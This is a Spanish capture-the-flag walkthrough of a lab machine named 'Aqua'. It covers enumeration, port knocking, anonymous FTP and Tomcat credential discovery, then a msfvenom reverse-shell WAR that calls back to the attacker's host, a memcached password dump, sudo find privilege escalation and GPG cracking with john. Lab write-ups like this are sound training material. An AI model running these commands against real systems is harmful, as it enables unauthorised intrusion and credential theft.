#Maquina Aqua

Sistema Operativo: Linux
Dificultad: Media

# Enumeracion de Puertos y Servicios
-------------------------
# PUERTOS
------------------------
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8009/tcp open  ajp13
8080/tcp open  http-proxy

-------------------------
# SERVICIOS
---------------------------

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 00:11:32:04:42:e0:7f:98:29:7c:1c:2a:b8:a7:b0:4a (RSA)
|   256 9c:92:93:eb:1c:8f:84:c8:73:af:ed:3b:65:09:e4:89 (ECDSA)
|_  256 a8:5b:df:d0:7e:31:18:6e:57:e7:dd:6b:d5:89:44:98 (ED25519)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Todo sobre el Agua
8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
|_ajp-methods: Failed to get a valid response for the OPTION request
8080/tcp open  http    Apache Tomcat 8.5.5
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/8.5.5
MAC Address: 08:00:27:7E:F4:F5 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-----------------------------
con nmap enumeraremos 4 directorios y archivos que contiene 
----------------------------
 nmap --script http-enum -p80,8080 192.168.2.242 -oN webscan
Starting Nmap 7.70 ( https://nmap.org ) at 2022-03-16 16:14 CET
Nmap scan report for 192.168.2.242
Host is up (0.0039s latency).

PORT     STATE SERVICE
80/tcp   open  http
| http-enum: 
|   /robots.txt: Robots file
|   /css/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
|_  /img/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
8080/tcp open  http-proxy
| http-enum: 
|   /examples/: Sample scripts
|   /manager/html/upload: Apache Tomcat (401 )
|   /manager/html: Apache Tomcat (401 )
|_  /docs/: Potentially interesting folder
MAC Address: 08:00:27:7E:F4:F5 (Oracle VirtualBox virtual NIC)

#Puerto 80
# Enumeracion Web

La pagina web tiene un texto  

# El agua (del latín aqua)

El (agua)1 es una sustancia cuya molécula está compuesta por dos átomos de hidrógeno y uno de oxígeno (H2O)2.

#robots.txt

/SuperCMS

#Fuzzing

web puerto 80
http://192.168.2.242/

000039:  C=301      9 L	      28 W	    312 Ch	  "img"
000550:  C=301      9 L	      28 W	    312 Ch	  "css"
#-------------------------------------------
http://192.168.2.242/SuperCMS
==================================================================
ID   Response   Lines      Word         Chars          Payload    
==================================================================

000002:  C=200    149 L	      25 W	    799 Ch	  "index - html"
000116:  C=200     47 L	      90 W	   2146 Ch	  "login - html"

en el codigofuente de /SuperCMS/index.html

tenemos una cadena de texto que esta cifrado en base64 "MT0yID0gcGFzc3dvcmRfemlwCg=="

echo "MT0yID0gcGFzc3dvcmRfemlwCg=="|base64 -d
1=2 = password_zip

conseguimos una pista 1=2 > password_zip, estos numeros los tenemos en el texto que copiamos antes 1 para agua 2 para H2O

tenemos una pagina llamada login.html le echamos un vistazo contiene un panel de login que no lleva a ningun lado esta de relleno

pero si miramos el codigo tiene un par de lienas comentadas

#------------------------------------------
<!--<button class="btn" href="www.twitter.com/AquilinoMS">Contact</button>-->
<!--https://web.archive.org/web/*/www.twitter.com/**********-->
<!--<p class ="Source"SuperCMS<span><a href="github.com/aquilino/SuperCMS"> look source code</a></span></p>-->

hay un repo de github  de SuperCMS, nos descargamos el repositorio y accedemos a la carpeta

❯ git clone https://github.com/aquilino/SuperCMS.git
cd SuperCMS
le hacemos un  git log y miramos los commits
buscamos algun commit sospechoso  y veremos uno que crea un archivo de texto knocking_on_Atlantis_door.txt

❯ git log -c 58afe63a1cd28fa167b95bcff50d2f6f011337c1
commit 58afe63a1cd28fa167b95bcff50d2f6f011337c1
Author: aquilino <hidro23@hotmail.com>
Date:   Thu Jun 17 12:59:05 2021 +0200

    Create knocking_on_Atlantis_door.txt
    
    Las Puertas del avismo

diff --git a/knocking_on_Atlantis_door.txt b/knocking_on_Atlantis_door.txt
new file mode 100644
index 0000000..84cdd81
--- /dev/null
+++ b/knocking_on_Atlantis_door.txt
@@ -0,0 +1,2 @@
+Para abrir  las puertas esta es la secuencia
+(☞ﾟヮﾟ)☞ 1100,800,666 ☜(ﾟヮﾟ☜)


tenemos una secuencia de puertos para un port Knocking

probaremos esta secuencia y pasaremos nmap para ver que puerto se ha abierto ?¿

con for golpeamos los puertos

for i in 1100 800 666; do nmap -Pn --max-retries 0 -p $i 192.168.2.242; done

y se nos abre el puerto 21 ftp
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
80/tcp   open  http
8009/tcp open  ajp13
8080/tcp open  http-proxy

comprobamos el puerto 21 con nmap 
#-------------------------------
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 0        0            4096 Jun 30  2021 pub
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 192.168.0.55
|      Logged in as ftp
|      TYPE: ASCII
|      Session bandwidth limit in byte/s is 1048576
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status

tenemos acceso como usuario anonymous


#------------------------------
# FTP
#--------------------------------
❯ ftp 192.168.2.242
Connected to 192.168.2.242.
220 (vsFTPd 3.0.3)
Name (192.168.2.242:h1dr0): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    3 0        0            4096 Feb 03  2021 .
drwxr-xr-x    3 0        0            4096 Feb 03  2021 ..
drwxr-xr-x    2 0        0            4096 Jun 30  2021 pub
226 Directory send OK.
ftp> cd pub
250 Directory successfully changed.
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 Jun 30  2021 .
drwxr-xr-x    3 0        0            4096 Feb 03  2021 ..
-rw-r--r--    1 0        0            1250 Feb 03  2021 .backup.zip
226 Directory send OK.
ftp> get .backup.zip
local: .backup.zip remote: .backup.zip

accedemos veremos una carpeta y dentro tenemos un archivo zip

lo descargamos y intentamos descomprimirlo pero nos pide un password que anteriormente decubrimos

passwword_zip = agua=H2O

una vez descomprimido encotramos un archivo critico de tomcat donde se guardan las credenciales de usuario

<user username="aquaMan" password="P4st3lM4n" roles="manager-gui,admin-gui"/>

# Credenciales 

aquaMan:P4st3lM4n --> tomcat
--------------------------

con estas credenciales accedemos al servicio tomcat


como veremos podemos hacer un deploy de un archivo war que con msfvenom crearemos.
❯ msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.0.55 LPORT=443 -f war -o shell.war
Payload size: 1091 bytes
Final size of war file: 1091 bytes
Saved as: shell.war


lo subimos a la web y nos ponemos a la escucha con nc 

❯ nc -vnlp 443
listening on [any] 443 ...
connect to [192.168.0.55] from (UNKNOWN) [192.168.2.242] 46710
id
uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat)

accedemos como el usuario tomcat

miramos el /etc/passwd para ver los usuarios

cat /etc/passwd| grep sh$
root:x:0:0:root:/root:/bin/bash
tridente:x:1000:1000:Poseidon Perez,,,:/home/tridente:/bin/bash

hacemos un tratamineto de la tty lo hago con python que no me da problemas
python -c 'import pty;pty.spawn("/bin/bash")
ctrl +z
stty raw -echo;fg
export TERM=xterm
export SHELL=bash
stty rows 57 columns 212

#Pivoting User
si le hacemos un ps aux verermos que usa memcached

/usr/bin/memcached -m 64 -p 11211 -u memcache -l 127.0.0.1

probaremos a entrar nc localhost 11211

stats veremos el listado

con stats cachedump 1 100

nos hace un volcado de memoria y veremos mas informacion

con get y el item que queremos nos lo reportara

stats cachedump 1 100
ITEM email [17 b; 0 s]
ITEM Name [14 b; 0 s]
ITEM password [18 b; 0 s]
ITEM username [8 b; 0 s]
END
get Name
VALUE Name 0 14
Poseidon Perez
END
get password
VALUE password 0 18
N3ptun0D10sd3lM4r$
END
---------------------------
si miramos el /etc/passwd veremos quiene es el user Poseidon perez

accedemos por ssh como el usuario tridente y conseguimos la primera flag

tridente@Atlantis:~$ id;whoami;hostname
uid=1000(tridente) gid=1000(tridente) groups=1000(tridente)
tridente
Atlantis


#Escalada de Privilegios
con sudo -l podemos ejecutar el binario find que se encuentra en la carpeta /home/tridente
tridente@hidr0Gen:~$ sudo -l
[sudo] password for tridente: 
Matching Defaults entries for tridente on Atlantis:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User tridente may run the following commands on Atlantis:
    (root) /home/tridente/find

tridente@Atlantis:~$ sudo -u root /home/tridente/find . -exec /bin/sh \; -quit
[sudo] password for tridente: 
# id;whoami;hostname
uid=0(root) gid=0(root) groups=0(root)
root
Atlantis
#

si miramos la flag esta encriptada  la pasaremos a nuestra terminal Y usaremos gpg2john y luego con john intentamos romperlo.

❯ /opt/john/run/gpg2john root.txt.gpg > hash

❯ /opt/john/run/john --wordlist=/usr/share/wordlists/rockyou.txt --format=gpg hash
Using default input encoding: UTF-8
Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
Cost 1 (s2k-count) is 48234496 for all loaded hashes
Cost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 2 for all loaded hashes
Cost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 9 for all loaded hashes
Will run 4 OpenMP threads
Press Ctrl-C to abort, or send SIGUSR1 to john process for status
arthur           (?)     
1g 0:00:01:30 DONE (2022-03-16 18:29) 0.01099g/s 15.73p/s 15.73c/s 15.73C/s bernard..12345a
Use the "--show" option to display all of the cracked passwords reliably
Session completed.


con gpg -d root.txt.gpg  podremos ver la flag de root

Hasta aqui la maquina Aqua.
